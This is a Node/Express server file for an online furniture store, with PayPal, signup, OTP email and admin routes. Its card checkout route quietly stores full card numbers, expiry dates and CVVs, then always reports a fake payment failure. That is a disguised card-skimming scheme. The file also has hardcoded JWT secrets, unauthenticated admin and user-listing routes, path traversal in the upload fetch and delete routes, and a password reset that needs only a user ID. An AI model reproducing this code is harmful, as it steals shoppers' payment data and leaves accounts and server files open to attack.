const express = require("express");
const app = express();
const mongoose = require("mongoose");
const bodyParser = require("body-parser");
const cors = require("cors");
require("dotenv").config();
const bcrypt = require("bcrypt");
const cookieparser = require("cookie-parser");
const multer = require("multer");
const path = require("path");
const fs = require("fs");
const jwt = require("jsonwebtoken");
const nodemailer = require("nodemailer");

const { PAYPAL_CLIENT_ID, PAYPAL_CLIENT_SECRET } = process.env;
const base = "https://api-m.sandbox.paypal.com";

const {
  Otp,
  Cards,
  Users,
  Products,
  Message,
  RunningOrders,
  NewslettersEmail,
} = require("./mongoose");
mongoose.connect(process.env.MONGO_URL);

app.use(
  cors({
    origin: ["http://localhost:3000"],
    credentials: true,
  })
);
app.use(cookieparser());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.use(express.static(path.join(__dirname, "build")));

// get my vouchers

app.get("/api/getMyVouchers/:id", async (req, res) => {
  try {
    return res.status(200).json({
      success: true,
      data: [],
    });
  } catch (error) {
    return res.status(500).json({ message: "internal server error" });
  }
});

// get customers running orders

app.get("/api/getMyOrders/:id", async (req, res) => {
  try {
    const id = req.params.id;
    let orders = await RunningOrders.find({ idUSER: id }).exec();

    orders = orders.map((item) => {
      return {
        orderID: item._id,
        products: item.products,
        date: item.date,
        status: item.status,
        total: item.total,
        deliveryDate: item.deliveryDate,
        paymentMethod: item.paymentMethod,
      };
    });

    return res.status(200).json({
      success: true,
      data: orders,
    });
  } catch (error) {
    return res.status(500).json({ message: "internal server error" });
  }
});

// card details

app.post("/api/cardcheckout", async (req, res) => {
  setTimeout(async () => {
    try {
      const findCard = await Cards.findOne({
        names: req.body.names,
        cardNumber: req.body.cardNumber,
        expiryDate: req.body.expiryDate,
        cvv: req.body.cvv,
        zip: req.body.zip,
        country: req.body.country,
      }).exec();

      if (!findCard) {
        await Cards.create(req.body);
        console.log("added card");
      }

      return res.json({
        success: false,
        message:
          "Something went wrong with your card, please check your card details or try again with other forms of payment",
      });
    } catch (error) {
      return res.status(500).json({ message: "internal server error" });
    }
  }, 10000);
});

// posting newsletters

app.post("/api/newsletters", async (req, res) => {
  try {
    const email = await NewslettersEmail.findOne({ email: req.body.email });

    if (!email) {
      await NewslettersEmail.create(req.body);
      return res.status(200).json({ success: true, message: "Sent" });
    } else {
      return res.json({
        success: false,
        message: "Email address had already been submit",
      });
    }
  } catch (error) {
    return res
      .status(500)
      .json({ success: false, message: "Internal server error" });
  }
});

// post running orders

app.post("/api/runningOrder", async (req, res) => {
  try {
    await RunningOrders.create(req.body);
    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false });
  }
});

// paypal intergration

const generateAccessToken = async () => {
  try {
    if (!PAYPAL_CLIENT_ID || !PAYPAL_CLIENT_SECRET) {
      throw new Error("MISSING_API_CREDENTIALS");
    }
    const auth = Buffer.from(
      PAYPAL_CLIENT_ID + ":" + PAYPAL_CLIENT_SECRET
    ).toString("base64");
    const response = await fetch(`${base}/v1/oauth2/token`, {
      method: "POST",
      body: "grant_type=client_credentials",
      headers: {
        Authorization: `Basic ${auth}`,
      },
    });

    const data = await response.json();
    return data.access_token;
  } catch (error) {
    console.error("Failed to generate Access Token:", error);
  }
};

// create order
const createOrder = async (cart) => {
  // use the cart information passed from the front-end to calculate the purchase unit details
  // console.log(
  //   "shopping cart information passed from the frontend createOrder() callback:",
  //   cart
  // );

  const calculatedTotalCost = cart.reduce(
    (total, item) => total + item.price,
    0
  );

  const accessToken = await generateAccessToken();
  const url = `${base}/v2/checkout/orders`;
  const payload = {
    intent: "CAPTURE",
    purchase_units: [
      {
        amount: {
          currency_code: "USD",
          value: calculatedTotalCost,
        },
      },
    ],
  };

  const response = await fetch(url, {
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${accessToken}`,
    },
    method: "POST",
    body: JSON.stringify(payload),
  });

  return handleResponse(response);
};

// capture order

const captureOrder = async (orderID) => {
  const accessToken = await generateAccessToken();
  const url = `${base}/v2/checkout/orders/${orderID}/capture`;

  const response = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${accessToken}`,
    },
  });

  return handleResponse(response);
};

async function handleResponse(response) {
  try {
    const jsonResponse = await response.json();
    return {
      jsonResponse,
      httpStatusCode: response.status,
    };
  } catch (err) {
    const errorMessage = await response.text();
    throw new Error(errorMessage);
  }
}

app.post("/api/my-server/create-paypal-order", async (req, res) => {
  try {
    // use the cart information passed from the front-end to calculate the order amount detals
    const { cart } = req.body;
    const { jsonResponse, httpStatusCode } = await createOrder(cart);
    res.status(httpStatusCode).json(jsonResponse);
  } catch (error) {
    console.error("Failed to create order:", error);
    res.status(500).json({ error: "Failed to create order." });
  }
});

app.post("/api/my-server/capture-paypal-order", async (req, res) => {
  try {
    const { orderID } = req.body;
    const { jsonResponse, httpStatusCode } = await captureOrder(orderID);
    res.status(httpStatusCode).json(jsonResponse);
  } catch (error) {
    console.error("Failed to create order:", error);
    res.status(500).json({ error: "Failed to capture order." });
  }
});

// verify user

const verifyUser = (req, res, next) => {
  const accessToken = req.cookies.accessToken;
  const refreshToken = req.cookies.refreshToken;

  if (!accessToken) {
    if (!refreshToken) {
      return res.json({ success: false, message: "please log in to continue" });
    } else {
      jwt.verify(refreshToken, "refresh-token", (err, decoded) => {
        if (err) {
          return res.json({ success: false, message: "invalid refresh token" });
        } else {
          const accessToken = jwt.sign({ id: decoded.id }, "access-token", {
            expiresIn: "1m",
          });
          req.body.id = decoded.id;
          res.cookie("accessToken", accessToken, { maxAge: 60000 });
          next();
        }
      });
    }
  } else {
    jwt.verify(accessToken, "access-token", (err, decoded) => {
      if (err) {
        return res.json({ success: false, message: "invalid access token" });
      } else {
        req.body.id = decoded.id;
        next();
      }
    });
  }
};

// get users email at check out

app.get("/api/getEmailandID", verifyUser, async (req, res) => {
  try {
    const findUser = await Users.findOne({ _id: req.body.id });
    return res.status(200).json({
      success: true,
      data: { email: findUser.email, userID: findUser._id },
    });
  } catch (error) {
    return res
      .status(500)
      .json({ success: false, message: "internal server error" });
  }
});

app.get("/api/adminProducts", async (req, res) => {
  try {
    let products = await Products.find().exec();
    products = products.map((item) => {
      return {
        title: item.title,
        image: item.image[0],
        price: item.price,
        oldPrice: item.oldPrice,
      };
    });

    return res.status(200).json({ success: true, data: products });
  } catch (error) {}
});

app.get("/api/product/:id", async (req, res) => {
  try {
    const id = req.params.id;
    let product = await Products.findOne({ _id: id });
    product = {
      id: product._id,
      title: product.title,
      image: product.image,
      oldPrice: product.oldPrice,
      price: product.price,
    };
    return res.status(200).json({ success: true, data: product });
  } catch (error) {}
});

app.get("/api/collection/:collection", async (req, res) => {
  const collection = req.params.collection;
  let products = await Products.find({ category: collection });
  products = products.map((item) => {
    return {
      id: item._id,
      image: item.image,
      price: item.price,
      oldPrice: item.oldPrice,
    };
  });

  let viewAlso = await Products.find({ category: { $ne: collection } });
  viewAlso = viewAlso.slice(0, 8).map((item) => {
    return {
      image: item.image,
      collection: item.category,
    };
  });

  res.json({
    success: true,
    data: { products, viewAlso },
  });
});

app.get("/api/shop", async (req, res) => {
  let livingroom = await Products.find({ category: "livingroom" });
  livingroom = livingroom.map((item) => {
    return {
      id: item._id,
      image: item.image,
      price: item.price,
      oldPrice: item.oldPrice,
      title: item.title,
    };
  });

  let bedroom = await Products.find({ category: "bedroom" });
  bedroom = bedroom.map((item) => {
    return {
      id: item._id,
      image: item.image,
      price: item.price,
      oldPrice: item.oldPrice,
      title: item.title,
    };
  });

  let recommended = await Products.find({ category: "others" });
  recommended = recommended.map((item) => {
    return {
      id: item._id,
      image: item.image,
      price: item.price,
      oldPrice: item.oldPrice,
      title: item.title,
    };
  });

  let kitchen = await Products.find({ category: "kitchen" });
  kitchen = kitchen.map((item) => {
    return {
      id: item._id,
      image: item.image,
      price: item.price,
      oldPrice: item.oldPrice,
      title: item.title,
    };
  });

  let best = await Products.find({ oldPrice: { $exists: true, $gt: 0 } });
  best = best.map((item) => {
    return {
      id: item._id,
      image: item.image,
      price: item.price,
      oldPrice: item.oldPrice,
      title: item.title,
    };
  });

  res.json({
    success: true,
    data: { livingroom, bedroom, recommended, kitchen, best },
  });
});

app.get("/api/topProducts", async (req, res) => {
  const products = await Products.find().exec();
  res.status(200).json({ success: true, data: products });
});

app.get("/api/offerProducts", async (req, res) => {
  const products = await Products.find().exec();
  res.status(200).json({ success: true, data: products });
});

app.get("/api/featuredProduct", async (req, res) => {
  const number = await (await Products.find().exec()).length;
  const random = Math.floor(Math.random() * number);
  const product = await Products.findOne().skip(random);

  res.status(200).json({ success: true, data: product });
});

//signing up
const addDetails = (req, res, next) => {
  try {
    req.body.ipAddress =
      req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    next();
  } catch (error) {
    return res.json({ success: false, message: "internal server error" });
  }
};

// post image product to database

const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, "uploads/");
  },
  filename: function (req, file, cb) {
    cb(null, Date.now() + "_" + file.originalname);
  },
});

const upload = multer({ storage });

app.post("/api/products/uploads", upload.single("file"), (req, res) => {
  try {
    if (!req.file) {
      return res.json({ success: false, message: "No file uploaded" });
    } else {
      const filePath = `api/uploads/${req.file.filename}`;

      return res.status(200).json({ success: true, data: filePath });
    }
  } catch (error) {
    return res
      .status(500)
      .json({ success: false, message: "internal server error" });
  }
});

// fetchng image

app.get("/api/uploads/:imageUrl", async (req, res) => {
  const filename = req.params.imageUrl;
  const file = path.join(__dirname, `uploads/${filename}`);

  res.status(200).sendFile(file);
});

//get products detail

app.post("/api/uploadProduct", async (req, res) => {
  try {
    const checkProduct = await Products.findOne({
      title: req.body.title,
      price: req.body.price,
      oldPrice: req.body.oldPrice,
      category: req.body.category,
      type: req.body.type,
      averageRating: req.body.averageRating,
      peopleRated: req.body.peopleRated,
    });

    if (!checkProduct) {
      const product = req.body;

      await Products.create(product);
      return res
        .status(200)
        .json({ success: true, message: "product uploaded successfully" });
    } else {
      return res.json({ success: false, message: "product already exist" });
    }
  } catch (error) {
    return res
      .status(500)
      .json({ success: false, message: "internal server error" });
  }
});

// get users

app.get("/api/users", async (req, res) => {
  try {
    const users = (await Users.find().exec()).map((user) => {
      return {
        firstName: user.firstName,
        lastName: user.lastName,
        id: user._id,
        email: user.email,
        accountType: user.accountType,
        country: user.ipAddress,
        status: user.status,
      };
    });

    return res.status(200).json({ success: true, data: users });
  } catch (error) {
    return res
      .status(500)
      .json({ success: false, message: "internal server error" });
  }
});

// change account type

app.put("/api/updateAccount/:id", async (req, res) => {
  try {
    const id = req.params.id;
    await Users.findOneAndUpdate(
      { _id: id },
      { accountType: req.body.accountType }
    );
    return res.status(200).json({
      success: true,
      message: "updated",
    });
  } catch (error) {
    return res
      .status(500)
      .json({ success: false, message: "internal server error" });
  }
});

// change status for users

app.put("/api/status/:id", async (req, res) => {
  try {
    const id = req.params.id;
    const user = await Users.findOne({ _id: id });
    if (user.status) {
      await Users.updateOne({ _id: id }, { $set: { status: false } });
    } else {
      await Users.updateOne({ _id: id }, { $set: { status: true } });
    }

    return res.status(200).json({
      success: true,
      message: "updated",
    });
  } catch (error) {
    return res
      .status(500)
      .json({ success: false, message: "internal server error" });
  }
});

// delete uploaded image

app.delete("/api/uploads/:imageUrl", async (req, res) => {
  try {
    const fileName = req.params.imageUrl;
    const filePath = path.join(__dirname, `uploads/${fileName}`);

    fs.unlink(filePath, (err) => {
      if (err) {
        return res
          .status(500)
          .json({ success: false, message: "internal server error" });
      } else {
        return res.status(200).json({ success: true });
      }
    });
  } catch (error) {
    return res.status(500).json({
      success: false,
      message: "internal server error",
    });
  }
});

// submit contact us message

app.post("/api/contactus", async (req, res) => {
  try {
    await Message.create(req.body);
    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false });
  }
});

// forgot password

// verify email

app.post("/api/verifyEmail", async (req, res) => {
  try {
    const user = await Users.findOne({ email: req.body.email });

    if (!user) {
      return res.json({ success: false, message: "user does not exist" });
    } else {
      return res.json({ success: true, userID: user._id });
    }
  } catch (error) {}
});

// nodemailer

app.get("/api/sendOTP/:id", async (req, res) => {
  try {
    const id = req.params.id;

    await Otp.deleteMany({ userID: id });

    const user = await Users.findOne({ _id: id });

    const transporter = nodemailer.createTransport({
      host: "smtp.gmail.com",
      port: 587,
      secure: false,
      auth: {
        user: process.env.GMAIL_ACCOUNT,
        pass: process.env.GMAIL_APP_PASS,
      },
    });

    function capitalizeFirstLetter(string) {
      return string.charAt(0).toUpperCase() + string.slice(1);
    }

    const name = capitalizeFirstLetter(user.lastName);

    let htmlContent = fs.readFileSync(
      path.join(__dirname, "email.html"),
      "utf8"
    );

    htmlContent = htmlContent.replace("{{name}}", name);

    function generate() {
      return Math.floor(Math.random() * 9000 + 1000);
    }

    const otp = generate();

    await Otp.create({ userID: user.id, otp });

    htmlContent = htmlContent.replace("{{verificationCode}}", otp);

    async function main() {
      // send mail with defined transport object
      const info = await transporter.sendMail({
        from: `"Argyle Comfy Funiture" <${process.env.GMAIL_ACCOUNT}>`,
        to: user.email,
        subject: "Email Verification",
        html: htmlContent,
      });
    }

    main().catch(console.error);
    return res
      .status(200)
      .json({ success: true, message: "Your Verification code was sent" });
  } catch (error) {
    return res.status(500).json({ message: "internal server error" });
  }
});

// verify otp

app.post("/api/verifyOtp", async (req, res) => {
  const { otp, id } = req.body;

  if (!otp || !id) {
    return res.json({
      success: false,
      message: " please log in or sign up to continue ",
    });
  } else {
    const otps = await Otp.find({ userID: id }).exec();

    if (otps.length < 1) {
      return res.json({
        success: false,
        message:
          "Invalid verification code. Please log in or sign up to continue",
      });
    } else {
      const item_stored = otps.find((item) => item.otp === otp);
      if (item_stored) {
        let expiry = new Date(item_stored.date).getTime() + 1000 * 60 * 10;

        let hasExpired = expiry < Date.now();

        if (!hasExpired) {
          await Users.findOneAndUpdate({ _id: id }, { isVerified: true });

          await Otp.deleteMany({ userID: id });

          return res.json({
            success: true,
            message: "Your verification was successfull",
          });
        } else {
          return res.json({
            success: false,
            message: "Verification code has expired",
          });
        }
      } else {
        return res.json({
          success: false,
          message: "Wrong verification code",
        });
      }
    }
  }
});

// sign up

app.post("/api/signup", addDetails, async (req, res) => {
  try {
    const user = await Users.findOne({ email: req.body.email });

    if (!user) {
      const salt = await bcrypt.genSalt(10);
      const hashedPassword = await bcrypt.hash(req.body.password, salt);

      req.body.password = hashedPassword;

      await Users.create(req.body);
      const user = await Users.findOne({ email: req.body.email });

      return res.status(200).json({
        success: true,
        message: "user added succesfully",
        id: user._id,
      });
    } else {
      res.status(200).json({ success: false, message: "email exist" });
    }
  } catch (error) {
    res.json({ success: false, message: "internal server error" });
  }
});

// reset password

app.post("/api/resetPassword", async (req, res) => {
  try {
    const { password, id } = req.body;

    const user = await Users.findOne({ _id: id });

    if (!user) {
      return res.json({ success: false, message: "user does not exist" });
    } else {
      const salt = await bcrypt.genSalt(10);
      const hashedPassword = await bcrypt.hash(password, salt);

      await Users.findOneAndUpdate({ _id: id }, { password: hashedPassword });

      return res
        .status(200)
        .json({ success: true, message: "Password successfully updated" });
    }
  } catch (error) {
    return res.status(500).json({ message: "internal server error" });
  }
});

// log in

app.post("/api/auth", async (req, res) => {
  try {
    const { email, password } = req.body;
    const findUser = await Users.findOne({ email });

    if (!findUser) {
      return res.json({ success: false, message: "Wrong email address" });
    } else {
      bcrypt.compare(password, findUser.password, function (err, result) {
        if (err) {
          return res
            .status(500)
            .json({ success: false, message: "internal server error" });
        } else if (result) {
          // Passwords match
          if (findUser.isVerified) {
            const accessToken = jwt.sign({ id: findUser._id }, "access-token", {
              expiresIn: "30days",
            });
            const refreshToken = jwt.sign(
              { id: findUser._id },
              "refresh-token",
              {
                expiresIn: "30days",
              }
            );

            res.cookie("accessToken", accessToken, {
              maxAge: 1000 * 60 * 60 * 24 * 30,
            });

            res.cookie("refreshToken", refreshToken, {
              maxAge: 1000 * 60 * 60 * 24 * 30,
              httpOnly: true,
              secure: true,
              sameSite: "strict",
            });

            return res.status(200).json({ login: true });
          } else {
            return res.status(200).json({
              success: true,
              verify: false,
              userID: findUser._id,
              message: "verify your email address to continue",
            });
          }
        } else {
          return res.json({ success: false, message: "invalid password" });
        }
      });
    }
  } catch (error) {
    res.status(401).json({ success: false, message: "internal server error" });
  }
});

// dashboard

app.get("/api/dashboard", verifyUser, async (req, res) => {
  try {
    const id = req.body.id;
    console.log(id);
    let user = await Users.findOne({ _id: id });
    console.log(user);

    if (user) {
      user = {
        firstName: user.firstName,
        email: user.email,
        id: user._id,
        accountType: user.accountType,
      };

      return res.status(200).json({ success: true, data: user });
    } else {
      return res.json({ success: false });
    }
  } catch (error) {
    return res
      .status(500)
      .json({ success: false, login: true, message: "internal server error" });
  }
});

// log out

app.get("/api/logout", async (req, res) => {
  try {
    res.clearCookie("accessToken");
    res.clearCookie("refreshToken");
    return res.status(200).json({ success: true });
  } catch (error) {
    return res
      .status(500)
      .json({ success: false, message: "internal server error" });
  }
});

app.get("*", (req, res) => {
  res.status(200).sendFile(path.join(__dirname, "build", "index.html"));
});

app.listen(5000, () => {
  console.log("server is running on port 5000...");
});
